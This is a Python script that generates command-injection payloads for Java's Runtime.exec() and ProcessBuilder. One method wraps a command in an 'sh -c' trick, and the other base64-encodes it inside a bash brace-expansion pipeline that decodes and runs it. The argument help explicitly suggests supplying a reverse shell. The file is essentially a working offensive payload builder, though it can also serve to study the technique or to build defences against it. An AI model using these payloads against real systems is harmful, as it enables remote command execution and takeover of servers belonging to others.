from subprocess import Popen, PIPE
import base64
import argparse

def java_exec_method1(cmd):
    return "sh -c $@|sh . echo {0}".format(cmd)

def java_exec_method2(cmd):
    b64_cmd = base64.b64encode(cmd.encode('ascii'))
    return "/bin/bash -c {{echo,{0}}}|{{base64,-d}}|/bin/bash".format(b64_cmd.decode('ascii'))


parser = argparse.ArgumentParser(description='Script to create a payload to execute with Runtime.getRuntimeExe().exec() or with ProcessBuilder.start() methods')
parser.add_argument('--cmd', help='Command or reverse shell to use', required=True)
parser.add_argument('-m','--method', type=int, choices=[1, 2],help='Payload method, if none is declared then method 1 is used - See README file')
parser.add_argument('-v','--verbosity', action="store_true")
parser.add_argument('-t','--test', action="store_true")
args = parser.parse_args()


command=args.cmd
method=1
if args.method:
    method=args.method

test=False
if args.test:
    test=args.test


if args.verbosity:
    print("Using method {0}".format(method))

result=""
if method==1:
    result=java_exec_method1(command)
elif method==2:
    result=java_exec_method2(command)

print("Using command \"{0}\"".format(command))
print("Result: {0}".format(result))

if test and args.verbosity:
    print("* Testing payload *")
    #TODO
